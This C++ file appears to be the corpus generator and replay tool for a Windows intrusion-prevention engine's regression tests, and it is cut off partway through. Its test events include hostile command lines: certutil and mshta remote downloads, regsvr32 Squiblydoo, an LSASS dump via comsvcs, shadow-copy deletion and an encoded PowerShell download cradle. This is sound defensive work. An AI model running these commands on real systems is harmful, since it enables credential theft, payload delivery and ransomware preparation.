#include "bulwark/Clock.h"
#include "bulwark/engine/DefaultRules.h"
#include "bulwark/engine/RuleEngine.h"
#include "bulwark/engine/SystemPaths.h"
#include "bulwark/models/DefenseRule.h"
#include "bulwark/models/RuntimeSettings.h"
#include "bulwark/models/SecurityEvent.h"
#include "bulwark/models/Verdict.h"
#include "bulwark/ipc/IpcMessage.h"
#include "bulwark/ipc/Payloads.h"
#include "bulwark/ipc/PipeNames.h"
#include "bulwark/models/AttackGraph.h"
#include "bulwark/models/PersistenceEntry.h"
#include "bulwark/models/ProcessEntry.h"

#include <QByteArray>
#include <QDateTime>
#include <QDir>
#include <QElapsedTimer>
#include <QFile>
#include <QFileInfo>
#include <QHash>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QString>
#include <QStringList>
#include <QTextStream>
#include <QTimeZone>
#include <QVector>

#include <cstdio>
#include <limits>

using namespace bulwark;
using namespace bulwark::engine;

namespace {

constexpr int kSchema = 1;

const char *kFixedNowIso = "2026-01-15T12:00:00.000Z";

QDateTime fixedNow()
{
    return QDateTime::fromString(QString::fromLatin1(kFixedNowIso), Qt::ISODateWithMs)
        .toTimeZone(QTimeZone::UTC);
}

QTextStream &out()
{
    static QTextStream s(stdout);
    return s;
}

QTextStream &err()
{
    static QTextStream s(stderr);
    return s;
}

bool readJson(const QString &path, QJsonObject *outObj)
{
    QFile f(path);
    if (!f.open(QIODevice::ReadOnly)) {
        err() << "无法打开: " << path << "\n";
        return false;
    }
    QJsonParseError pe{};
    const QJsonDocument doc = QJsonDocument::fromJson(f.readAll(), &pe);
    if (pe.error != QJsonParseError::NoError || !doc.isObject()) {
        err() << "JSON 解析失败: " << path << " -> " << pe.errorString() << "\n";
        return false;
    }
    *outObj = doc.object();
    return true;
}

bool writeJson(const QString &path, const QJsonObject &obj)
{
    QFile f(path);
    if (!f.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
        err() << "无法写入: " << path << "\n";
        return false;
    }
    f.write(QJsonDocument(obj).toJson(QJsonDocument::Indented));
    return true;
}

QUuid stableId(const QString &label)
{
    return QUuid::createUuidV5(QUuid{}, label.toUtf8());
}

struct EventSpec {
    QString   label;
    QString   note;
    EventType type = EventType::ProcessCreate;
    int       pidOffset = 0;
    QString   actorPath;
    QString   commandLine;
    QString   target;
    QString   detail;
    QString   parentPath;
    bool      signed_ = false;
    QString   publisher;
    QString   thumbprint;
    bool      certRevoked = false;
    bool      signedAfterExpiry = false;
    bool      signatureMismatch = false;
    bool      moduleSigned = false;
    bool      moduleSignatureMismatch = false;
    bool      firstSeen = false;
    qint64    fileSize = 64 * 1024;
    QString   hash;
    int       secondsOffset = 0;
    std::optional<int> certValidDays;
};

SecurityEvent makeEvent(const EventSpec &s)
{
    SecurityEvent e;
    e.id = stableId(s.label);
    e.timestampUtc = fixedNow().addSecs(s.secondsOffset);
    e.type = s.type;
    e.actorPid = 4000 + s.pidOffset;
    e.actorPath = s.actorPath;
    e.actorHash = s.hash;
    e.actorSigned = s.signed_;
    e.signatureMismatch = s.signatureMismatch;
    e.actorFileSize = s.fileSize;
    e.actorPublisher = s.publisher;
    e.actorCertThumbprint = s.thumbprint;
    e.certRevoked = s.certRevoked;
    e.signedAfterCertExpiry = s.signedAfterExpiry;
    e.targetSigned = s.moduleSigned;
    e.targetSignatureMismatch = s.moduleSignatureMismatch;
    e.isFirstSeen = s.firstSeen;
    e.parentPid = 1000;
    e.parentPath = s.parentPath;
    e.commandLine = s.commandLine;
    e.target = s.target;
    e.detail = s.detail;
    if (s.certValidDays.has_value())
        e.certNotAfterUtc = fixedNow().addDays(*s.certValidDays);
    return e;
}

QJsonObject caseToJson(const EventSpec &s)
{
    QJsonObject o;
    o["label"] = s.label;
    o["note"] = s.note;
    o["event"] = makeEvent(s).toJson();
    return o;
}

}

namespace {

const char *kSelfDir = "C:\\Program Files\\Bulwark\\";
const char *kCanary  = "C:\\Users\\Public\\Documents\\__bulwark_canary__.docx";

EventSpec msSystem32(const QString &label, const QString &note, const QString &exe,
                     const QString &cmd, int pid)
{
    EventSpec s;
    s.label = label;
    s.note = note;
    s.type = EventType::ProcessCreate;
    s.pidOffset = pid;
    s.actorPath = QStringLiteral("C:\\Windows\\System32\\") + exe;
    s.commandLine = cmd;
    s.target = exe;
    s.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
    s.signed_ = true;
    s.publisher = QStringLiteral("Microsoft Corporation");
    s.hash = QStringLiteral("1111111111111111111111111111111111111111111111111111111111111111");
    return s;
}

QVector<EventSpec> buildCorpusCases()
{
    QVector<EventSpec> v;

    {
        EventSpec s;
        s.label = QStringLiteral("step1-self-component");
        s.note = QStringLiteral("步骤1:本软件自身组件,无条件放行(早于一切检测)");
        s.type = EventType::FileWrite;
        s.pidOffset = 1;
        s.actorPath = QString::fromLatin1(kSelfDir) + QStringLiteral("bulwark_service.exe");
        s.target = QStringLiteral("C:\\ProgramData\\Bulwark\\rules.json");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step1-user-trusted-file");
        s.note = QStringLiteral("步骤1:用户明确信任的文件,跳过后续全部检测");
        s.type = EventType::ProcessCreate;
        s.pidOffset = 2;
        s.actorPath = QStringLiteral("C:\\Tools\\trusted_tool.exe");
        s.commandLine = QStringLiteral("\"C:\\Tools\\trusted_tool.exe\" -enc AAAA");
        s.target = QStringLiteral("trusted_tool.exe");
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step2-security-product-coexist");
        s.note = QStringLiteral("步骤2:火绒 HipsDaemon 位于 Program Files,共存放行");
        s.type = EventType::RegistryWrite;
        s.pidOffset = 3;
        s.actorPath = QStringLiteral("C:\\Program Files\\Huorong\\Sysdiag\\bin\\HipsDaemon.exe");
        s.target = QStringLiteral("HKLM\\SYSTEM\\CurrentControlSet\\Services\\Sysdiag\\Start");
        s.signed_ = true;
        s.publisher = QStringLiteral("Beijing Huorong Network Technology Co., Ltd.");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step2-security-name-outside-installdir");
        s.note = QStringLiteral("步骤2 反例:安全软件同名程序但落在 Temp,不得共存放行");
        s.type = EventType::RegistryWrite;
        s.pidOffset = 4;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\HipsDaemon.exe");
        s.target = QStringLiteral("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\x");
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step3-vendor-app-network");
        s.note = QStringLiteral("步骤3:微信健康签名 + 网络外联,放行(压制心跳被判 C2)");
        s.type = EventType::NetworkConnect;
        s.pidOffset = 5;
        s.actorPath = QStringLiteral("C:\\Program Files\\Tencent\\WeChat\\WeChat.exe");
        s.target = QStringLiteral("203.205.239.1");
        s.detail = QStringLiteral("443");
        s.signed_ = true;
        s.publisher = QStringLiteral("Tencent Technology (Shenzhen) Company Limited");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step3-vendor-app-imageload-NOT-exempt");
        s.note = QStringLiteral("步骤3 边界:同一厂商应用的模块加载【不】走该豁免,侧载须照常检测");
        s.type = EventType::ImageLoad;
        s.pidOffset = 5;
        s.actorPath = QStringLiteral("C:\\Program Files\\Tencent\\WeChat\\WeChat.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\evil_hook.dll");
        s.signed_ = true;
        s.publisher = QStringLiteral("Tencent Technology (Shenzhen) Company Limited");
        v.push_back(s);
    }

    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-certutil-urlcache"),
        QStringLiteral("步骤4:certutil 远程下载(T1105),硬指标"),
        QStringLiteral("certutil.exe"),
        QStringLiteral("certutil.exe -urlcache -split -f http://198.51.100.7/p.exe %TEMP%\\p.exe"),
        10));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-regsvr32-squiblydoo"),
        QStringLiteral("步骤4:regsvr32 Squiblydoo 远程脚本执行(T1218.010)"),
        QStringLiteral("regsvr32.exe"),
        QStringLiteral("regsvr32.exe /s /n /u /i:http://198.51.100.7/a.sct scrobj.dll"),
        11));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-mshta-remote"),
        QStringLiteral("步骤4:mshta 远程 HTA(T1218.005)"),
        QStringLiteral("mshta.exe"),
        QStringLiteral("mshta.exe http://198.51.100.7/x.hta"),
        12));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-comsvcs-lsass-dump"),
        QStringLiteral("步骤4:rundll32 comsvcs.dll MiniDump 转储 LSASS(T1003.001)"),
        QStringLiteral("rundll32.exe"),
        QStringLiteral("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\l.dmp full"),
        13));
    v.push_back(msSystem32(
        QStringLiteral("step4-lolbin-vssadmin-delete-shadows"),
        QStringLiteral("步骤4:删除卷影(T1490)—— 勒索前置动作,一瞬间完成故必须硬拦"),
        QStringLiteral("vssadmin.exe"),
        QStringLiteral("vssadmin.exe delete shadows /all /quiet"),
        14));
    v.push_back(msSystem32(
        QStringLiteral("step4-powershell-encoded-download"),
        QStringLiteral("步骤4:powershell -enc + 内存下载执行(T1059.001 + T1105)"),
        QStringLiteral("WindowsPowerShell\\v1.0\\powershell.exe"),
        QStringLiteral("powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0"
                       "ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnAA=="),
        15));

    {
        EventSpec s;
        s.label = QStringLiteral("step4-masquerade-svchost-outside-system32");
        s.note = QStringLiteral("步骤4:系统进程名出现在非法目录(T1036.005)");
        s.pidOffset = 20;
        s.actorPath = QStringLiteral("C:\\Users\\Public\\svchost.exe");
        s.target = QStringLiteral("svchost.exe");
        s.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-typosquat-svch0st");
        s.note = QStringLiteral("步骤4:形近字冒充系统进程(编辑距离<=1)");
        s.pidOffset = 21;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\svch0st.exe");
        s.target = QStringLiteral("svch0st.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-double-extension");
        s.note = QStringLiteral("步骤4:双扩展名伪装(T1036.007)");
        s.pidOffset = 22;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Downloads\\invoice.pdf.exe");
        s.target = QStringLiteral("invoice.pdf.exe");
        s.parentPath = QStringLiteral("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-office-spawns-lolbin");
        s.note = QStringLiteral("步骤4:Office 派生脚本宿主(宏病毒/钓鱼典型链)");
        s.pidOffset = 23;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
        s.commandLine = QStringLiteral("powershell.exe -ExecutionPolicy Bypass -w hidden -File C:\\Users\\u\\a.ps1");
        s.target = QStringLiteral("powershell.exe");
        s.parentPath = QStringLiteral("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE");
        s.signed_ = true;
        s.publisher = QStringLiteral("Microsoft Corporation");
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step4-remote-thread-into-lsass");
        s.note = QStringLiteral("步骤4:向 lsass 建远程线程(凭据访问 + 注入双硬指标)");
        s.type = EventType::RemoteThread;
        s.pidOffset = 24;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\dump.exe");
        s.target = QStringLiteral("C:\\Windows\\System32\\lsass.exe");
        s.firstSeen = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-sideload-unsigned-dll-from-temp");
        s.note = QStringLiteral("步骤4:签名宿主从可写目录加载未签名模块(白加黑侧载)");
        s.type = EventType::ImageLoad;
        s.pidOffset = 25;
        s.actorPath = QStringLiteral("C:\\Program Files\\SomeVendor\\host.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\version.dll");
        s.signed_ = true;
        s.publisher = QStringLiteral("SomeVendor Ltd");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step4-sideload-SIGNED-dll-from-temp-NOT-detected");
        s.note = QStringLiteral("步骤4 对照:签名宿主从可写目录加载【签名健康】模块 —— "
                                "正当形态(安装器解压到 Temp 后加载),不得命中侧载判据");
        s.type = EventType::ImageLoad;
        s.pidOffset = 26;
        s.actorPath = QStringLiteral("C:\\Program Files\\SomeVendor\\host.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\vendor_helper.dll");
        s.signed_ = true;
        s.publisher = QStringLiteral("SomeVendor Ltd");
        s.moduleSigned = true;
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step5-ransomware-canary-touch");
        s.note = QStringLiteral("步骤5:改写勒索诱饵文件 —— 强勒索信号,直接 Block");
        s.type = EventType::FileWrite;
        s.pidOffset = 30;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\locker.exe");
        s.target = QString::fromLatin1(kCanary);
        s.firstSeen = true;
        v.push_back(s);
    }

    for (int i = 0; i < 10; ++i) {
        EventSpec s;
        s.label = QStringLiteral("step5-beacon-%1").arg(i, 2, 10, QLatin1Char('0'));
        s.note = QStringLiteral("步骤5:周期性外联第 %1 拍(60s 间隔,低抖动)").arg(i + 1);
        s.type = EventType::NetworkConnect;
        s.pidOffset = 31;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Roaming\\updater.exe");
        s.target = QStringLiteral("198.51.100.42");
        s.detail = QStringLiteral("8443");
        s.secondsOffset = 600 + i * 60;
        s.firstSeen = (i == 0);
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step5-dga-dns-query");
        s.note = QStringLiteral("步骤5:高熵无元音域名(纯字符串统计,不依赖黑名单)");
        s.type = EventType::DnsQuery;
        s.pidOffset = 32;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Roaming\\updater.exe");
        s.target = QStringLiteral("xkqvbzrmthnwpldj.top");
        s.secondsOffset = 1300;
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step6-explicit-block-rule");
        s.note = QStringLiteral("步骤6:命中语料自带的用户 Block 规则");
        s.pidOffset = 40;
        s.actorPath = QStringLiteral("C:\\Tools\\blocked_tool.exe");
        s.target = QStringLiteral("blocked_tool.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Some Publisher");
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step7-strongly-trusted-ms-system32");
        s.note = QStringLiteral("步骤7:微软签名 + 系统目录 + 无危险行为 -> 跳过行为检测");
        s.type = EventType::FileWrite;
        s.pidOffset = 41;
        s.actorPath = QStringLiteral("C:\\Windows\\System32\\notepad.exe");
        s.target = QStringLiteral("C:\\Users\\u\\Documents\\note.txt");
        s.signed_ = true;
        s.publisher = QStringLiteral("Microsoft Corporation");
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step8-cert-revoked");
        s.note = QStringLiteral("步骤8:证书已被吊销 -> Block");
        s.pidOffset = 42;
        s.actorPath = QStringLiteral("C:\\Program Files\\Vendor\\app.exe");
        s.target = QStringLiteral("app.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Revoked Vendor");
        s.certRevoked = true;
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step8-signed-after-cert-expiry");
        s.note = QStringLiteral("步骤8:证书过期之后才签名(时间戳伪造迹象)-> Block");
        s.pidOffset = 43;
        s.actorPath = QStringLiteral("C:\\Program Files\\Vendor\\app2.exe");
        s.target = QStringLiteral("app2.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Expired Vendor");
        s.signedAfterExpiry = true;
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step9-healthy-signed-allow");
        s.note = QStringLiteral("步骤9:合法厂商签名且健康 -> 放行");
        s.type = EventType::FileWrite;
        s.pidOffset = 44;
        s.actorPath = QStringLiteral("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Google\\Chrome\\User Data\\x.tmp");
        s.signed_ = true;
        s.publisher = QStringLiteral("Google LLC");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step9-firstseen-shortlived-cert");
        s.note = QStringLiteral("步骤9 边界:首见 + 证书剩余不足186天(空壳公司新证书)-> 不走健康签名放行");
        s.pidOffset = 45;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Downloads\\newapp.exe");
        s.target = QStringLiteral("newapp.exe");
        s.signed_ = true;
        s.publisher = QStringLiteral("Brand New LLC");
        s.firstSeen = true;
        s.certValidDays = 90;
        v.push_back(s);
    }

    {
        EventSpec s;
        s.label = QStringLiteral("step11-unsigned-benign-allow");
        s.note = QStringLiteral("步骤11:未签名但无任何硬指标 -> 一律放行(软信号绝不单独定罪)");
        s.type = EventType::FileWrite;
        s.pidOffset = 46;
        s.actorPath = QStringLiteral("C:\\Users\\u\\Documents\\myscript_output.exe");
        s.target = QStringLiteral("C:\\Users\\u\\Documents\\out.txt");
        v.push_back(s);
    }
    {
        EventSpec s;
        s.label = QStringLiteral("step11-unsigned-from-temp-softsignals-only");
        s.note = QStringLiteral("步骤11:未签名 + Temp 目录 + 首见 —— 全是软信号,仍应放行而非拦截");
        s.type = EventType::FileWrite;
        s.pidOffset = 47;
        s.actorPath = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\installer_helper.exe");
        s.target = QStringLiteral("C:\\Users\\u\\AppData\\Local\\Temp\\payload.dat");
        s.firstSeen = true;
        v.push_back(s);
    }

    return v;
}

QVector<DefenseRule> buildCorpusRules()
{
    QVector<DefenseRule> v;
    {
        DefenseRule r = DefenseRule::createTrust(QStringLiteral("C:\\Tools\\trusted_tool.exe"),
                                                 QStringLiteral("语料:用户信任项"));
        r.id = stableId(QStringLiteral("rule-trust-tool"));
        r.createdUtc = fixedNow().addDays(-30);
        v.push_back(r);
    }
    {
        DefenseRule r;
        r.id = stableId(QStringLiteral("rule-block-tool"));
        r.actorPath = QStringLiteral("C:\\Tools\\blocked_tool.exe");
        r.action = VerdictAction::Block;
        r.note = QStringLiteral("语料:用户 Block 规则");
        r.createdUtc = fixedNow().addDays(-10);
        v.push_back(r);
    }
    return v;
}

QJsonObject buildCorpus()
{
    QJsonObject root;
    root["schema"] = kSchema;
    root["fixedNowUtc"] = QString::fromLatin1(kFixedNowIso);

    QJsonArray selfDirs;
    selfDirs.append(QString::fromLatin1(kSelfDir));
    root["selfDirectories"] = selfDirs;

    QJsonArray canaries;
    canaries.append(QString::fromLatin1(kCanary));
    root["canaryFiles"] = canaries;

    QJsonObject engine;
    engine["enableBaseline"] = true;
    engine["trustSignedActors"] = true;
    root["engine"] = engine;

    QJsonArray rules;
    for (const DefenseRule &r : buildCorpusRules())
        rules.append(r.toJson());
    root["rules"] = rules;

    QJsonArray cases;
    for (const EventSpec &s : buildCorpusCases())
        cases.append(caseToJson(s));
    root["cases"] = cases;

    return root;
}

struct CaseResult {
    QString     label;
    QJsonObject snapshot;
};

// 不变量:fp-* 是误报回归哨兵,最终裁决绝不能是 Block。
// (允许带 HardIndicator 信号 —— 分析器会给出信号,但规则/信任通道必须把它落回
//  Ask/Allow。真正要钉住的是「最终不拦」。)
static int checkFpInvariants(const QVector<CaseResult> &results)
{
    int bad = 0;
    for (const CaseResult &r : results) {
        if (!r.label.startsWith(QLatin1String("fp")))
            continue;
        const QString action = r.snapshot.value(QLatin1String("action")).toString();
        if (action == QLatin1String("Block")) {
            ++bad;
            out() << "FP-INVARIANT  " << r.label
                  << "  最终动作是 Block(误报哨兵不得拦)\n";
        }
    }
    if (bad == 0)
        out() << "fp 不变量: " << results.size() << " 条用例中 fp-* 均未 Block  OK\n";
    out().flush();
    return bad;
}

QJsonObject snapshotOf(const SecurityEvent &e, const Verdict &v)
{
    QJsonObject o;
    o["action"] = verdictActionToString(v.action);
    o["source"] = verdictSourceToString(v.source);
    o["riskScore"] = e.riskScore;
    o["hasThreatIndicator"] = e.hasThreatIndicator;
    o["matchedRuleNote"] = e.matchedRuleNote;
    o["userTrusted"] = e.userTrusted;
    o["memoryInjection"] = e.memoryInjection;

    QJsonArray tech;
    for (const QString &t : e.techniques)
        tech.append(t);
    o["techniques"] = tech;

    QJsonArray reasons;
    for (const QString &r : e.riskReasons)
        reasons.append(r);
    o["riskReasons"] = reasons;

    QJsonArray ev;
    for (const Evidence &x : e.evidenceChain) {
        QJsonObject j;
        j["source"] = x.source;
        j["kind"] = evidenceKindToString(x.kind);
        j["description"] = x.description;
        j["scoreDelta"] = x.scoreDelta;
        ev.append(j);
    }
    o["evidence"] = ev;
    return o;
}

bool replay(const QJsonObject &corpus, QVector<CaseResult> *results, QString *fixedNowOut)
{
    if (corpus.value(QLatin1String("schema")).toInt() != kSchema) {
        err() << "语料 schema 版本不匹配(期望 " << kSchema << ")\n";
        return false;
    }
    const QString nowIso = corpus.value(QLatin1String("fixedNowUtc")).toString();
    const QDateTime pinned = QDateTime::fromString(nowIso, Qt::ISODateWithMs).toTimeZone(QTimeZone::UTC);
    if (!pinned.isValid()) {
        err() << "语料缺少有效的 fixedNowUtc\n";
        return false;
    }
    *fixedNowOut = nowIso;

    setFixedNowUtcForTest(pinned);

    RuleEngine engine;
    const QJsonObject eng = corpus.value(QLatin1String("engine")).toObject();
    engine.enableBaseline = eng.value(QLatin1String("enableBaseline")).toBool(true);
    engine.trustSignedActors = eng.value(QLatin1String("trustSignedActors")).toBool(true);

    for (const QJsonValue &v : corpus.value(QLatin1String("selfDirectories")).toArray())
        engine.addSelfDirectory(v.toString());
    for (const QJsonValue &v : corpus.value(QLatin1String("canaryFiles")).toArray())
        engine.addCanaryFile(v.toString());

    QVector<DefenseRule> rules = DefaultRules::build();
    for (const QJsonValue &v : corpus.value(QLatin1String("rules")).toArray())
        rules.push_back(DefenseRule::fromJson(v.toObject()));
    engine.loadRules(rules);

    const QJsonArray cases = corpus.value(QLatin1String("cases")).toArray();
    results->reserve(cases.size());
    for (const QJsonValue &cv : cases) {
        const QJsonObject c = cv.toObject();
        SecurityEvent e = SecurityEvent::fromJson(c.value(QLatin1String("event")).toObject());
        const Verdict verdict = engine.evaluate(e);
        CaseResult r;
        r.label = c.value(QLatin1String("label")).toString();
        r.snapshot = snapshotOf(e, verdict);
        results->push_back(r);
    }

    setFixedNowUtcForTest(QDateTime());
    return true;
}

void diffArrays(const QString &field, const QJsonArray &want, const QJsonArray &got,
                QStringList *msgs)
{
    if (want == got)
        return;
    msgs->append(QStringLiteral("      %1: 期望 %2 项,实际 %3 项")
                     .arg(field)
                     .arg(want.size())
                     .arg(got.size()));
    const int n = qMax(want.size(), got.size());
    for (int i = 0; i < n; ++i) {
        const QJsonValue a = i < want.size() ? want.at(i) : QJsonValue();
        const QJsonValue b = i < got.size() ? got.at(i) : QJsonValue();
        if (a == b)
            continue;
        const auto render = [](const QJsonValue &v) -> QString {
            if (v.isUndefined() || v.isNull())
                return QStringLiteral("<缺失>");
            if (v.isString())
                return v.toString();
            return QString::fromUtf8(QJsonDocument(v.toObject()).toJson(QJsonDocument::Compact));
        };
        msgs->append(QStringLiteral("        [%1] 期望: %2").arg(i).arg(render(a)));
        msgs->append(QStringLiteral("        [%1] 实际: %2").arg(i).arg(render(b)));
    }
}

int compare(const QJsonObject &golden, const QVector<CaseResult> &results)
{
    if (golden.value(QLatin1String("schema")).toInt() != kSchema) {
        err() << "黄金文件 schema 版本不匹配(期望 " << kSchema << ")\n";
        return 1;
    }
    const QJsonArray want = golden.value(QLatin1String("results")).toArray();
    int failed = 0;

    if (want.size() != results.size()) {
        out() << "用例数不一致:黄金 " << want.size() << " 条,本次回放 " << results.size() << " 条\n";
        ++failed;
    }

    const int n = qMin(want.size(), results.size());
    for (int i = 0; i < n; ++i) {
        const QJsonObject w = want.at(i).toObject();
        const QString wLabel = w.value(QLatin1String("label")).toString();
        const QString gLabel = results[i].label;
        if (wLabel != gLabel) {
            out() << "[" << i << "] 标签不一致:黄金 " << wLabel << ",本次 " << gLabel << "\n";
            ++failed;
            continue;
        }
        const QJsonObject wSnap = w.value(QLatin1String("snapshot")).toObject();
        const QJsonObject gSnap = results[i].snapshot;
        if (wSnap == gSnap)
            continue;

        ++failed;
        out() << "MISMATCH  " << gLabel << "\n";
        QStringList msgs;
        for (const QString &key : { QStringLiteral("action"), QStringLiteral("source"),
                                    QStringLiteral("riskScore"), QStringLiteral("hasThreatIndicator"),
                                    QStringLiteral("matchedRuleNote"), QStringLiteral("userTrusted"),
                                    QStringLiteral("memoryInjection") }) {
            const QJsonValue a = wSnap.value(key);
            const QJsonValue b = gSnap.value(key);
            if (a != b) {
                msgs.append(QStringLiteral("      %1: 期望 %2,实际 %3")
                                .arg(key,
                                     a.toVariant().toString(),
                                     b.toVariant().toString()));
            }
        }
        diffArrays(QStringLiteral("techniques"), wSnap.value(QLatin1String("techniques")).toArray(),
                   gSnap.value(QLatin1String("techniques")).toArray(), &msgs);
        diffArrays(QStringLiteral("riskReasons"), wSnap.value(QLatin1String("riskReasons")).toArray(),
                   gSnap.value(QLatin1String("riskReasons")).toArray(), &msgs);
        diffArrays(QStringLiteral("evidence"), wSnap.value(QLatin1String("evidence")).toArray(),
                   gSnap.value(QLatin1String("evidence")).toArray(), &msgs);
        for (const QString &m : msgs)
            out() << m << "\n";
    }
    return failed;
}

int checkRuleset()
{
    const QVector<DefenseRule> rules = DefaultRules::build();
    QHash<QUuid, QStringList> byId;
    for (const DefenseRule &r : rules)
        byId[r.id].append(r.note);

    int dup = 0;
    for (auto it = byId.constBegin(); it != byId.constEnd(); ++it) {
        if (it.value().size() <= 1)
            continue;
        ++dup;
        out() << "DUPLICATE ID  " << it.key().toString(QUuid::WithoutBraces) << "\n";
        for (const QString &n : it.value())
            out() << "      " << n << "\n";
    }

    out() << "内置规则 " << rules.size() << " 条,唯一 id " << byId.size() << " 个";
    if (dup == 0)
        out() << "  OK\n";
    else
        out() << "  发现 " << dup << " 组撞 id —— 这些规则会在 loadRules 时被静默丢弃\n";
    out().flush();
    return (dup == 0 && !rules.isEmpty()) ? 0 : 1;
}

int dumpRules(const QString &path)
{
    const QVector<DefenseRule> rules = DefaultRules::build();
    QJsonArray arr;
    for (const DefenseRule &r : rules)
        arr.append(r.toJson());
    QJsonObject root;
    root[QStringLiteral("count")] = arr.size();
    root[QStringLiteral("rules")] = arr;
    if (!writeJson(path, root))
        return 1;
    out() << "已导出内置规则: " << path << "  " << arr.size() << " 条\n";
    out().flush();
    return 0;
}

int dumpModels(const QString &path)
{
    QJsonObject root;

    root[QStringLiteral("settingsDefaults")] = RuntimeSettings{}.toJson();

    {
        RuntimeSettings s;
        s.protectionEnabled = false;
        s.processProtection = false;
        s.fileProtection = false;
        s.registryProtection = false;
        s.selfProtection = false;
        s.networkProtection = false;
        s.memoryProtectionEnabled = false;
        s.trustSignedActors = false;
        s.defaultBlock = true;
        s.silentMode = true;
        s.promptTimeoutSeconds = 45;
        s.aiBaseUrl = QStringLiteral("https://ai.example.com/v1");
        s.aiApiKey = QStringLiteral("ai-key");
        s.aiModel = QStringLiteral("some-model");
        s.kernelDriverEnabled = true;
        s.userModeBehaviorMonitor = false;
        s.ransomwareCanaryEnabled = false;
        s.behaviorBaselineEnabled = false;
        s.aiCreditGuardEnabled = false;
        s.aiMonthlyCreditBudget = 9007199254740991LL;
        s.eventSource = QStringLiteral("Driver");
        s.kernelConnected = true;
        s.kernelStatus = QString::fromUtf8("\xe5\xb7\xb2\xe8\xbf\x9e\xe6\x8e\xa5");
        s.quarantineOnBlock = true;
        root[QStringLiteral("settingsFilled")] = s.toJson();
    }

    {
        QJsonObject sparse;
        sparse[QStringLiteral("protectionEnabled")] = false;
        sparse[QStringLiteral("promptTimeoutSeconds")] = 5;
        sparse[QStringLiteral("eventSource")] = QStringLiteral("Driver");
        root[QStringLiteral("settingsSparseInput")] = sparse;
        root[QStringLiteral("settingsSparseParsed")] = RuntimeSettings::fromJson(sparse).toJson();
    }

    if (!writeJson(path, root))
        return 1;
    out() << "已导出模型样本: " << path << "\n";
    out().flush();
    return 0;
}

int dumpIpc(const QString &path)
{
    using namespace bulwark::ipc;
    QJsonObject root;
    root[QStringLiteral("schema")] = kSchema;
    root[QStringLiteral("fixedNow")] = QString::fromLatin1(kFixedNowIso);
    root[QStringLiteral("pipeName")] = controlPipe();

    const QDateTime t0 = fixedNow();

    QJsonArray envelopes;
    const auto addEnvelope = [&envelopes](const QString &note, const IpcMessage &m) {
        QJsonObject e;
        e[QStringLiteral("note")] = note;
        e[QStringLiteral("type")] = static_cast<int>(m.type);
        e[QStringLiteral("payload")] = m.payload;
        e[QStringLiteral("wire")] = m.serialize();
        envelopes.append(e);
    };
    {
        HelloPayload h;
        h.processId = 4242;
        h.role = QStringLiteral("ui");
        addEnvelope(QStringLiteral("Hello:典型的对象负载(双重编码)"),
                    IpcMessage::create(IpcMessageType::Hello, h.toJson()));
    }
    addEnvelope(QStringLiteral("LogEntry:纯文本负载"),
                IpcMessage::createRaw(IpcMessageType::LogEntry,
                                      QString::fromUtf8("已放行 C:\\Temp\\a b\\x.exe")));
